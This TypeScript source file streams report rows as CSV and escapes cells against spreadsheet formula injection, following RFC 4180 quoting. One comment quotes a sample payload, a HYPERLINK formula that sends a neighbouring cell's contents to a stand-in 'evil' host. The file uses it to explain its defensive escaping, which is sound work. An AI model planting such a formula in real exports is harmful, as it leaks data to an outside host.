// Copyright 2026 Kisaes LLC
// Licensed under the PolyForm Internal Use License 1.0.0.
// You may not distribute this software. See LICENSE for terms.
import type { Writable } from 'node:stream';
import type { ReportColumn } from '@vibept/shared';

/**
 * Stream report rows to a Writable (typically res) as CSV. The report's
 * row generator yields objects keyed by column.key; this writes the
 * header, then each row, flushing as it goes so the client can start
 * downloading before the full result is in memory.
 */
export async function streamCsv(
  columns: ReportColumn[],
  rows: AsyncIterable<Record<string, unknown>>,
  out: Writable,
): Promise<void> {
  out.write(columns.map((c) => csvCell(c.label)).join(',') + '\r\n');
  for await (const row of rows) {
    const line = columns.map((c) => csvCell(formatValue(row[c.key], c.type))).join(',');
    out.write(line + '\r\n');
  }
}

function formatValue(value: unknown, type: ReportColumn['type']): string {
  if (value === null || value === undefined) return '';
  if (type === 'hours' && typeof value === 'number') return (value / 3600).toFixed(2);
  if (type === 'datetime' && (typeof value === 'string' || value instanceof Date)) {
    const d = value instanceof Date ? value : new Date(value);
    return d.toISOString();
  }
  if (type === 'date' && (typeof value === 'string' || value instanceof Date)) {
    const d = value instanceof Date ? value : new Date(value);
    return d.toISOString().slice(0, 10);
  }
  if (type === 'boolean') return value ? 'true' : 'false';
  if (typeof value === 'number') return String(value);
  return String(value);
}

/**
 * Cells whose first character is `= + - @ \t \r` are interpreted by
 * Excel / Numbers / LibreOffice as formulas on file open. CPAs are the
 * primary download audience, so a malicious employee name like
 * `=HYPERLINK("http://evil/?x="&A1,…)` would exfiltrate the next-row
 * field when a manager opens the CSV. Prefix with a single quote so
 * the spreadsheet treats the cell as literal text. OWASP canonical
 * guidance.
 */
const FORMULA_INJECTION_LEAD = /^[=+\-@\t\r]/;

function csvCell(raw: string): string {
  const cell = FORMULA_INJECTION_LEAD.test(raw) ? `'${raw}` : raw;
  // RFC 4180 quoting: escape double-quotes, wrap anything containing
  // comma / quote / CR / LF. Runs after the formula-prefix step so the
  // injected leading quote is included inside the wrapping pair.
  if (/[",\r\n]/.test(cell)) return '"' + cell.replace(/"/g, '""') + '"';
  return cell;
}

/** Materialize an async iterable into an array (for JSON responses).
 *  Keeps reports able to declare themselves as streaming without
 *  duplicating code paths. */
export async function collect<T>(iter: AsyncIterable<T>): Promise<T[]> {
  const out: T[] = [];
  for await (const r of iter) out.push(r);
  return out;
}
